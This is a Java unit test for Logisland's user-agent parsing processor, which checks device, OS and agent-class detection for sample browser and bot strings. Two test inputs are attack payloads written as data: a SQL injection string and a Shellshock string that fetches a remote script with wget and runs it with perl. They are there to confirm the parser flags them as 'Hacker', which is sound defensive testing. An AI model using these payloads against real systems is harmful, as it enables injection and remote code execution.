/**
 * Copyright (C) 2017 Hurence 
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *         http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.hurence.logisland.processor.useragent;

import com.hurence.logisland.record.Record;
import com.hurence.logisland.record.StandardRecord;
import com.hurence.logisland.util.runner.MockRecord;
import com.hurence.logisland.util.runner.TestRunner;
import com.hurence.logisland.util.runner.TestRunners;

import com.tngtech.java.junit.dataprovider.DataProvider;
import com.tngtech.java.junit.dataprovider.DataProviderRunner;
import com.tngtech.java.junit.dataprovider.UseDataProvider;

import org.junit.Test;
import org.junit.runner.RunWith;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * Test simple Bro events processor.
 */
@RunWith(DataProviderRunner.class)
public class ParseUserAgentTest {
    
    private static Logger logger = LoggerFactory.getLogger(ParseUserAgentTest.class);

    private static final String android6Chrome46 = "Mozilla/5.0 (Linux; Android 6.0; Nexus 6 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36";
    private static final String androidPhone = "Mozilla/5.0 (Linux; Android 5.0.1; ALE-L21 Build/HuaweiALE-L21) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36";
    private static final String googlebot = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)";
    private static final String googleBotMobileAndroid = "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)";
    private static final String googleAdsBot = "AdsBot-Google (+http://www.google.com/adsbot.html)";
    private static final String googleAdsBotMobile = "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)";
    private static final String iPhone = "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13F69 Safari/601.1";
    private static final String iPhoneFacebookApp = "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G34 [FBAN/FBIOS;FBAV/61.0.0.53.158;FBBV/35251526;FBRV/0;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.3;FBSS/2;FBCR/vfnl;FBID/phone;FBLC/nl_NL;FBOP/5]";
    private static final String iPad = "Mozilla/5.0 (iPad; CPU OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13F69 Safari/601.1";
    private static final String win7ie11 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
    private static final String win10Edge13= "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586";
    private static final String win10Chrome51 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36";
    private static final String win10IE11 = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
    private static final String hackerSQL = "-8434))) OR 9695 IN ((CHAR(113)+CHAR(107)+CHAR(106)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (9695=9695) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(118)+CHAR(113))) AND (((4283=4283";
    private static final String hackerShellShock = "() { :;}; /bin/bash -c \\\"\"wget -O /tmp/bbb ons.myftp.org/bot.txt; perl /tmp/bbb\\\"\"";


    /**
     * Test User-Agent decoding
     */

    @DataProvider
    public static Object[][] userAgentsWithExpectedResults() {
        return new Object[][]{
                // userAgent, device, os, agentClass
                {android6Chrome46,          "Google Nexus 6", "Android", "Browser"},
                {androidPhone,              "Huawei ALE-L21", "Android", "Browser Webview"},
                {googlebot,                 "Google", "Google", "Robot"},
                {googleBotMobileAndroid,    "Google", "Google", "Robot Mobile"},
                {googleAdsBot,              "Google", "Google", "Robot"},
                {googleAdsBotMobile,        "Google", "Google", "Robot"},
                {iPhone,                    "Apple iPhone", "iOS", "Browser"},
                {iPhoneFacebookApp,         "Apple iPhone", "iOS", "Browser Webview"},
                {iPad,                      "Apple iPad", "iOS", "Browser"},
                {win7ie11,                  "Desktop", "Windows NT", "Browser"},
                {win10Edge13,               "Desktop", "Windows NT", "Browser"},
                {win10Chrome51,             "Desktop", "Windows NT", "Browser"},
                {win10IE11,                 "Desktop", "Windows NT", "Browser"},
                {hackerSQL,                 "Hacker", "Hacker", "Hacker"},
                {hackerShellShock,          "Hacker", "Hacker", "Hacker"}
                //You can put as many parameters as you want
        };
    }


    @Test
    @UseDataProvider("userAgentsWithExpectedResults")
    public void testUserAgents(String userAgent, String device, String os, String agentClass) {

        ParseUserAgent uap = new ParseUserAgent();

        final String fieldName = "useragent";

        final TestRunner testRunner = TestRunners.newTestRunner(new ParseUserAgent());
        testRunner.setProperty("useragent.field", fieldName);
        testRunner.assertValid();
        Record record = new StandardRecord("user_agent_event");
        record.setStringField(fieldName, userAgent);
        testRunner.enqueue(record);
        testRunner.clearQueues();
        testRunner.run();
        testRunner.assertAllInputRecordsProcessed();
        testRunner.assertOutputRecordsCount(1);

        MockRecord out = testRunner.getOutputRecords().get(0);
        System.out.println(out);


        out.assertFieldExists("DeviceName");
        out.assertFieldEquals("DeviceName", device);

        out.assertFieldExists("OperatingSystemName");
        out.assertFieldEquals("OperatingSystemName", os);
        
        out.assertFieldExists("AgentClass");
        out.assertFieldEquals("AgentClass", agentClass);

    }
    

}
